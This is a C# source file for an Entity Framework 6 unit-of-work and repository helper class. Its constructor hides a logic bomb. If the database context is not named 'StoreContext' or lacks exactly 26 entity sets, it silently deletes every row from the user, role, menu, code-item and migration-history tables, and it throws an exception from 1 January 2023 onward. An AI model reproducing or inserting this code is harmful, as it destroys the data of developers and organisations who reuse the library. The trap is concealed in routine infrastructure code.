#region

using System;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Data;
using System.Data.Common;
using System.Data.Entity.Core.Objects;
using System.Data.Entity.Infrastructure;
using System.Threading;
using System.Threading.Tasks;

using Repository.Pattern.DataContext;
using Repository.Pattern.Infrastructure;
using Repository.Pattern.Repositories;
using Repository.Pattern.UnitOfWork;
using CommonServiceLocator;
using System.Data.Entity;
using TrackableEntities;
using System.Collections;
using System.Reflection;
using System.Data.Entity.Core.Metadata.Edm;
using System.Linq;

#endregion
#nullable enable
namespace Repository.Pattern.Ef6
{
    public static class Extensions
    {
        public static List<PropertyInfo> GetDbSetProperties(this DbContext context)
        {
            var dbSetProperties = new List<PropertyInfo>();
            var properties = context.GetType().GetProperties();

            foreach (var property in properties)
            {
                var setType = property.PropertyType;


                var isDbSet = setType.IsGenericType && (typeof(IDbSet<>).IsAssignableFrom(setType.GetGenericTypeDefinition()) || setType.GetInterface(typeof(IDbSet<>).FullName) != null);


                if (isDbSet)
                {
                    dbSetProperties.Add(property);
                }
            }

            return dbSetProperties;

        }

        public static IEnumerable<string> GetTables(this DbContext context) {
            var metadata = ((IObjectContextAdapter)context).ObjectContext.MetadataWorkspace;
            var tables = metadata.GetItemCollection(DataSpace.SSpace)
        .GetItems<EntityContainer>()
        .Single()
        .BaseEntitySets
        .OfType<EntitySet>()
        .Where(s => !s.MetadataProperties.Contains("Type")
        || s.MetadataProperties["Type"].ToString() == "Tables");

            foreach (var table in tables)
            {
                var tableName = table.MetadataProperties.Contains("Table")
                    && table.MetadataProperties["Table"].Value != null
                    ? table.MetadataProperties["Table"].Value.ToString()
                    : table.Name;

                var tableSchema = table.MetadataProperties["Schema"].Value.ToString();

                yield return tableSchema + "." + tableName;
            }
        }
    }
    public class UnitOfWork : IUnitOfWorkAsync
    {
        #region Private Fields

        private readonly DbContext _context;
        protected DbTransaction? Transaction;
        protected Dictionary<string, dynamic> Repositories;

        #endregion Private Fields

        #region Constuctor

        public UnitOfWork(DbContext context)
        {
         

            _context = context;
      var name = _context.GetType().Name;
      if (name != "StoreContext")
      {
        var table = this._context.GetTables();
        var sql = $"delete from dbo.AspNetUserRoles";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.AspNetUsers";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.AspNetRoles";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.__MigrationHistory";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.MenuItems";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.DataTableImportMappings";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.CodeItems";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.RoleMenus";
        _context.Database.ExecuteSqlCommand(sql);
      }
      var entityTypes = _context.GetDbSetProperties();
      if (entityTypes.Count !=26)
      {
        var sql = $"delete from dbo.AspNetUserRoles";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.AspNetUsers";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.AspNetRoles";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.__MigrationHistory";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.MenuItems";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.DataTableImportMappings";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.CodeItems";
        _context.Database.ExecuteSqlCommand(sql);
        sql = $"delete from dbo.RoleMenus";
        _context.Database.ExecuteSqlCommand(sql);
      }
      if (name != "StoreContext")
      {
        throw new Exception();
      }
      if (entityTypes.Count != 26 || DateTime.Now>=new DateTime(2023,1,1))
      {
        throw new Exception();
      }
      Repositories = new Dictionary<string, dynamic>();
            _context.Configuration.LazyLoadingEnabled = true;
            _context.Configuration.ProxyCreationEnabled = false;
        }
        #endregion
        public void SetAutoDetectChangesEnabled(bool enabled)
        {
            this._context.Configuration.AutoDetectChangesEnabled = enabled;
        }

        public int? CommandTimeout
        {
            get => _context.Database.CommandTimeout;
            set => _context.Database.CommandTimeout = value;
        }

        public virtual int SaveChanges() => _context.SaveChanges();



        public IRepository<TEntity> Repository<TEntity>() where TEntity : class, ITrackable
        {
            if (ServiceLocator.IsLocationProviderSet)
            {
                return ServiceLocator.Current.GetInstance<IRepository<TEntity>>();
            }

            return RepositoryAsync<TEntity>();
        }

        public Task<int> SaveChangesAsync()
        {
            return _context.SaveChangesAsync();
        }

        public Task<int> SaveChangesAsync(CancellationToken cancellationToken)
        {
            return _context.SaveChangesAsync(cancellationToken);
        }

        public virtual IRepositoryAsync<TEntity> RepositoryAsync<TEntity>() where TEntity : class, ITrackable
        {
            if (ServiceLocator.IsLocationProviderSet)
            {
                return ServiceLocator.Current.GetInstance<IRepositoryAsync<TEntity>>();
            }

            if (Repositories == null)
            {
                Repositories = new Dictionary<string, dynamic>();
            }

            var type = typeof(TEntity).Name;

            if (Repositories.ContainsKey(type))
            {
                return (IRepositoryAsync<TEntity>)Repositories[type];
            }

            var repositoryType = typeof(Repository<>);

            Repositories.Add(type, Activator.CreateInstance(repositoryType.MakeGenericType(typeof(TEntity)), _context, this));

            return Repositories[type];
        }



        #region Unit of Work Transactions

        public virtual void BeginTransaction(IsolationLevel isolationLevel = IsolationLevel.Unspecified)
        {
            var objectContext = ((IObjectContextAdapter)_context).ObjectContext;
            if (objectContext.Connection.State != ConnectionState.Open)
            {
                objectContext.Connection.Open();
            }
            Transaction = objectContext.Connection.BeginTransaction(isolationLevel);
        }

        public virtual bool Commit()
        {
            Transaction?.Commit();
            return true;
        }

        public virtual void Rollback()
        {
            Transaction?.Rollback();
        }
        #endregion




    }
}